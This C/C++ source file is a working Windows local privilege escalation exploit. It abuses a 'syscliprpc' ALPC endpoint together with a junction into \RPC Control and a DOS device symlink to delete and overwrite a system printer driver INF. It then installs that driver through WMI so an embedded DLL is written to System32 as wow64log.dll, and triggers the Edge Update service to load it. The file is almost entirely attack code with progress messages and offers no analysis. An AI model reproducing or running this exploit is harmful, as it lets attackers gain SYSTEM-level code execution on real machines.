#include "def.h"


int wmain(int argc, wchar_t* argv[])
{
    load();
    LPWSTR alpc = Find();
    HANDLE h1;
    if (alpc == NULL) {
        printf("[!] Failed to find ALPC port!\n");
        return 1;
    }

    if (!CreateDirectory(sysmon, NULL)) {
        printf("[!] Failed to create %ls directory!\n",sysmon);
        return 1;
    }
    hSysmon = CreateFile(sysmon, FILE_WRITE_ATTRIBUTES | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT|FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (hSysmon == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open handle on %ls directory!\n", sysmon);
        return 1;
    }
    DosDeviceSymLink(object, BuildPath(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnge001.inf_amd64_1daeee8f3aa30fcb\\prnge001.inf"));
    CreateJunction(hSysmon, L"\\RPC Control");
   
    Trigger(alpc);
   
    do {
        h1 = CreateFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnge001.inf_amd64_1daeee8f3aa30fcb\\prnge001.inf", GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    } while (h1 != INVALID_HANDLE_VALUE);
    Sleep(500);
   
    printf("[+] Driver setup info file deleted!\n");
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Trigger, alpc, 0, NULL);
    do {
        h1 = CreateFile(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnge001.inf_amd64_1daeee8f3aa30fcb\\prnge001.inf", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    } while (h1 == INVALID_HANDLE_VALUE);
    HMODULE hm = GetModuleHandle(NULL);
    HRSRC res = FindResource(hm, MAKEINTRESOURCE(IDR_DLL1), L"dll");
    DWORD DllSize = SizeofResource(hm, res);
    void* DllBuff = LoadResource(hm, res);
    printf("[+] Driver setup info file written.\n");
    if (!AddPrinterDriverWmi()) {
        printf("[!] Failed to add print driver!\n");
        return 1;
    }
   
    HANDLE dll;
    do {
        Sleep(1000);
        dll = CreateFile(L"C:\\windows\\system32\\wow64log.dll", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    } while (dll == INVALID_HANDLE_VALUE);
    printf("[+] DLL created!\n");
    WriteFile(dll, DllBuff, DllSize, NULL, NULL);
    CloseHandle(dll);
    printf("[*] Triggering Edge Update service!\n");
    HRESULT coini = CoInitialize(NULL);
    IGoogleUpdate* updater = NULL;

    HRESULT hr = CoCreateInstance(__uuidof(CLSID_MSEdge_Object), NULL, CLSCTX_LOCAL_SERVER, __uuidof(updater), (PVOID*)&updater);
    
   
    DelDosDeviceSymLink(object, BuildPath(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnge001.inf_amd64_1daeee8f3aa30fcb\\prnge001.inf"));
    DeleteJunction(hSysmon);
    while(!DeleteFile(L"C:\\windows\\system32\\wow64log.dll")){}
    return 0;
}



void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtQueryDirectoryObject = (_NtQueryDirectoryObject)GetProcAddress(ntdll, "NtQueryDirectoryObject");
        pNtOpenDirectoryObect = (_NtOpenDirectoryObject)GetProcAddress(ntdll, "NtOpenDirectoryObject");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtQueryDirectoryObject == NULL || pNtOpenDirectoryObect == NULL|| pNtSetInformationFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }

}



BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}

LPWSTR Find() {
    HANDLE rpccontrolobj;
    OBJECT_ATTRIBUTES obj;
    const wchar_t rpccontrol[] = L"\\RPC Control";
    UNICODE_STRING unicode_string = { 0 };
    pRtlInitUnicodeString(&unicode_string, rpccontrol);
    InitializeObjectAttributes(&obj, &unicode_string, 0, 0, 00);
    NTSTATUS result = pNtOpenDirectoryObect(&rpccontrolobj, 0x0001 | 0x0002, &obj);
    if (result == 0) {

        BYTE* buffer = (BYTE*)malloc(100000);

        ULONG start = 0, index = 0, bytes;
        BOOLEAN restart = TRUE;
        for (;;)
        {
            result = pNtQueryDirectoryObject(rpccontrolobj, (PBYTE)buffer, 100000, FALSE, restart, &index, &bytes);
            if (result == 0)
            {
                POBJECT_DIRECTORY_INFORMATION objectlist = (POBJECT_DIRECTORY_INFORMATION)buffer;
                for (ULONG i = 0; i < index - start; i++)
                {
                    if (0 == wcsncmp(objectlist[i].TypeName.Buffer, L"ALPC Port", objectlist[i].TypeName.Length / sizeof(WCHAR)))
                    {
                        if (wcsstr(objectlist[i].Name.Buffer, L"syscliprpc")) {
                            return objectlist[i].Name.Buffer;

                        }


                    }
                }
            }
            if (STATUS_MORE_ENTRIES == result)
            {
                start = index;
                restart = FALSE;
                continue;
            }

            else if (STATUS_NO_MORE_ENTRIES == 0 || (result == 0)) {
                CloseHandle(rpccontrolobj);
                break;



            }
        }
        return NULL;
    }
    return NULL;
}

void Trigger(LPWSTR alpc)
{
    RPC_STATUS status;
    RPC_WSTR StringBinding;
    RPC_BINDING_HANDLE Binding;
    wchar_t data[] = L"; Windows Inbox Printer Drivers\n\n[Version]\nSignature=\"$Windows NT$\"\nProvider=\"Microsoft\"\nClassGUID={4D36E979-E325-11CE-BFC1-08002BE10318}\nClass=Printer\nCatalogFile=prnge001.cat\nDriverVer = 06/21/2006,10.0.19041.1\n\n\n[Manufacturer]\n\"Generic\"=Generic,NTamd64\n\n[Test.CopyFiles]\nwow64log.dll,TTY.DLL,,4\n\n[Test.CopyFiles.security]\n\"D:AI(A;;GA;;;SY)(A;;GA;;;AU)(A;;GA;;;BA)\"\n\n\n[Generic.NTamd64]\n\"Generic / Text Only\"                                         = TTY.GPD,GenericGeneric_/_Tex8040,Generic_/_Text_Only\n\"Generic IBM Graphics 9pin\"                                   = GENIBM9.GPD,GenericGeneric_IBM_GD35A,Generic_IBM_Graphics_9pin\n\"Generic IBM Graphics 9pin wide\"                              = GENIBM9W.GPD,GenericGeneric_IBM_GC7D5,Generic_IBM_Graphics_9pin_wide\n\"MS Publisher Color Printer\"                                  = MSGENCOL.PPD,GenericMS_Publisher_25C7,MS_Publisher_Color_Printer\n\"MS Publisher Imagesetter\"                                    = MSGENBW.PPD,GenericMS_Publisher_B397,MS_Publisher_Imagesetter\n\n\n[TTY.GPD]\nCopyFiles=@TTYRES.DLL,@TTY.INI,@TTY.DLL,@TTYUI.DLL,@TTY.GPD,@TTYUI.HLP\nCopyFiles=Test.CopyFiles\nDataFile=TTY.GPD\nCoreDriverSections=\"{D20EA372-DD35-4950-9ED8-A6335AFE79F0},UNIDRV.OEM,UNIDRV_DATA\"\n\n[GENIBM9.GPD]\nCopyFiles=@OK9IBRES.DLL,@GENIBM9.GPD\nDataFile=GENIBM9.GPD\nCoreDriverSections=\"{D20EA372-DD35-4950-9ED8-A6335AFE79F0},UNIDRV.OEM,UNIDRV_DATA\"\n\n[GENIBM9W.GPD]\nCopyFiles=@OK9IBRES.DLL,@GENIBM9W.GPD\nDataFile=GENIBM9W.GPD\nCoreDriverSections=\"{D20EA372-DD35-4950-9ED8-A6335AFE79F0},UNIDRV.OEM,UNIDRV_DATA\"\n\n[MSGENCOL.PPD]\nCopyFiles=@MSGENCOL.PPD\nDataFile=MSGENCOL.PPD\nCoreDriverSections=\"{D20EA372-DD35-4950-9ED8-A6335AFE79F1},PSCRIPT.OEM,PSCRIPT_DATA\"\n\n[MSGENBW.PPD]\nCopyFiles=@MSGENBW.PPD\nDataFile=MSGENBW.PPD\nCoreDriverSections=\"{D20EA372-DD35-4950-9ED8-A6335AFE79F1},PSCRIPT.OEM,PSCRIPT_DATA\"\n\n[DestinationDirs]\nDefaultDestDir=66000\nTest.CopyFiles=11\n\n[SourceDisksFiles]\nMSGENBW.PPD  = 1\nTTY.DLL      = 1\nTTYUI.HLP    = 1\nGENIBM9W.GPD = 1\nTTY.INI      = 1\nMSGENCOL.PPD = 1\nGENIBM9.GPD  = 1\nOK9IBRES.DLL = 1\nTTYUI.DLL    = 1\nTTYRES.DLL   = 1\nTTY.GPD      = 1\n\n[PrinterPackageInstallation.amd64]\nPackageAware=TRUE\nCoreDriverDependencies={D20EA372-DD35-4950-9ED8-A6335AFE79F0},{D20EA372-DD35-4950-9ED8-A6335AFE79F1}\nInboxVersionRequired=UseDriverVer\n\n[Strings]\n;Non-Localizable\n\n;Localizable\nDisk1=\"Windows Installation Disc\"\n\n[SourceDisksNames.x86]\n1   = %Disk1%,,,\"I386\"\n\n[SourceDisksNames.amd64]\n1   = %Disk1%,,,\"Amd64\"\n\n[SourceDisksNames.ia64]\n1   = %Disk1%,,,\"Ia64\"\n\n[SourceDisksNames.arm]\n1   = %Disk1%,,,\"arm\"\n\n[SourceDisksNames.arm64]\n1   = %Disk1%,,,\"arm64\"\n";
    status = RpcStringBindingCompose(NULL, (RPC_WSTR)L"ncalrpc", NULL, (RPC_WSTR)alpc, NULL, &StringBinding);

    status = RpcBindingFromStringBinding(StringBinding, &Binding);
    status = RpcStringFree(&StringBinding);
    RpcTryExcept
    {
        
        Proc1(Binding, 3036,data);
    }
    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        printf("Error: %d\n",RpcExceptionCode());
    }
    RpcEndExcept

        status = RpcBindingFree(&Binding);
}



LPWSTR  BuildPath(LPCWSTR path) {
    wchar_t ntpath[MAX_PATH];
    swprintf(ntpath, L"\\??\\%s", path);
    return ntpath;
}
BOOL AddPrinterDriverWmi() {
    HRESULT hr;
    hr = CoInitializeEx(0, COINIT_MULTITHREADED);
    if (FAILED(hr))
    {
        CoUninitialize();
        return FALSE;
    }
    hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    if (FAILED(hr))
    {
        CoUninitialize();
        return FALSE;
    }
    IWbemLocator* pLoc = NULL;

    hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);
    if (FAILED(hr))
    {
        CoUninitialize();
        return FALSE;
    }
    IWbemServices* pSvc = NULL;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\StandardCimv2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }
    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    if (FAILED(hr)) {
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }
    BSTR MethodName = SysAllocString(L"Add");
    BSTR ClassName = SysAllocString(L"MSFT_PrinterDriver");
    IWbemClassObject* pClass = NULL;
    hr = pSvc->GetObject(ClassName, 0, NULL, &pClass, NULL);
    IWbemClassObject* pInParamsDefinition = NULL;
    hr = pClass->GetMethod(MethodName, 0, &pInParamsDefinition, NULL);
    IWbemClassObject* pClassInstance = NULL;
    hr = pInParamsDefinition->SpawnInstance(0, &pClassInstance);
    VARIANT varCommand,varCommand2;
    varCommand.vt = VT_BSTR;
    varCommand.bstrVal = _bstr_t(L"Generic / Text Only");
    varCommand2.vt = VT_BSTR;
    varCommand2.bstrVal = _bstr_t(L"C:\\Windows\\System32\\DriverStore\\FileRepository\\prnge001.inf_amd64_1daeee8f3aa30fcb\\prnge001.inf");
    hr = pClassInstance->Put(L"Name", 0, &varCommand, 0);
    hr = pClassInstance->Put(L"InfPath", 0, &varCommand2, 0);
    IWbemClassObject* pOutParams = NULL;
    hr = pSvc->ExecMethod(ClassName, MethodName, 0, NULL, pClassInstance, &pOutParams, NULL);

    if (FAILED(hr))
    {

        VariantClear(&varCommand);
        SysFreeString(ClassName);
        SysFreeString(MethodName);
        pClass->Release();
        pClassInstance->Release();
        pInParamsDefinition->Release();
        pOutParams->Release();
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
        return FALSE;
    }
    return TRUE;
}
void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}